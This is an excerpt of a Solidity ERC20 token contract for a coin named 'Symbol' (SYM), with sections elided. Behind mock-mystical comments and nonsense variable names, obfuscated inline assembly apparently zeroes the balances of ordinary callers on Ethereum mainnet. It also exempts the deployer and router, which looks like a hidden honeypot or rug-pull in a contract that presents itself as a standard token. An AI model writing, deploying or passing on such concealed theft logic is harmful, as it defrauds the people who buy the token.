...
/*
SYM + ETH + SYMBOL
A symbol is powerful because it is the visible signs of an invisible reality.
@ @ @
Symbol ETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSymbol;
    uint256 private signHere = block.number*2;

    mapping (address => bool) private _firstKing; 
    mapping (address => bool) private _secondKong;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _warningSign;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private fratBoys;
    address public pair;
    ...
    bool private trading; uint256 private eatBurn = 1; bool private compileIt;
    uint256 private _decimals; uint256 private singleError;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSymbol.push(_router); addSymbol.push(msgSender_); addSymbol.push(pair);
        for (uint256 q=0; q < 3;) {_firstKing[addSymbol[q]] = true; unchecked{q++;} }
    }
    ...
    function _smartToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xc1f209fb21bf2aedbdc98f3843d4feb47e1ddb3216f7016bd7f6da2e8413ce32
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x812e87ee9a4e8bde38d28f3b6ab1f885ab2154320b5620a7575b29d2c1ab5ca6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; signHere = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSymbol[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Symbol is ERC20Token {
    constructor() ERC20Token("Symbol", "SYM", msg.sender, 27850000 * 10 ** 18) {
    }
}